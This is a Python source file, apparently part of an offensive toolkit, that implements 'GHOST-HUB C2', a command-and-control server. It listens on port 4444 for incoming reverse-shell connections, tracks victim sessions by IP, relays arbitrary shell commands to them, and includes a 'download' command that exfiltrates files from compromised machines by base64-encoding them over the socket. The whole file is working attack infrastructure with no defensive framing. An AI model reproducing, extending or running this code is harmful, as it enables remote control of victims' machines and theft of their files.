import socket
import threading
from rich.console import Console
from rich.table import Table
from core.ui import draw_header

console = Console()


class GhostHub:
    def __init__(self):
        self.sessions = {}
        self.counter = 1

    def interact(self, s_id):
        sock = self.sessions[s_id]['sock']
        console.print(
            f"[bold red][!] Shell Interactive. Type 'download <path>' or 'back'.[/bold red]")
        while True:
            cmd = console.input(f"Ghost-{s_id}> ").strip()
            if cmd == "back":
                break

            if cmd.startswith("download "):
                # Elite Exfiltration logic
                path = cmd.split(" ", 1)[1]
                sock.send(f"cat {path} | base64\n".encode())
                data = sock.recv(1000000).decode()
                with open(f"exfil_{s_id}_{path.split('/')[-1]}", "w") as f:
                    f.write(data)
                console.print("[green][+] Encrypted file exfiltrated.[/green]")
            else:
                sock.send((cmd + "\n").encode())
                console.print(sock.recv(8192).decode())

    def start_hub(self, port=4444):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(("0.0.0.0", int(port)))
        server.listen(10)
        while True:
            conn, addr = server.accept()
            s_id = self.counter
            self.sessions[s_id] = {'sock': conn, 'ip': addr[0]}
            self.counter += 1
            console.print(
                f"\n[bold green][+] NEW GHOST CONNECTED: {addr[0]} (ID: {s_id})[/bold green]")


def run_ghost_hub():
    hub = GhostHub()
    draw_header("GHOST-HUB C2")
    port = console.input("Listen Port [4444]: ") or "4444"
    threading.Thread(target=hub.start_hub, args=(port,), daemon=True).start()

    while True:
        table = Table(title="Active Ghost Sessions")
        table.add_column("ID")
        table.add_column("Target IP")
        for sid, d in hub.sessions.items():
            table.add_row(str(sid), d['ip'])
        console.print(table)

        cmd = console.input("\n[hub]> ").split()
        if not cmd:
            continue
        if cmd[0] == "interact":
            hub.interact(int(cmd[1]))
        elif cmd[0] == "exit":
            break
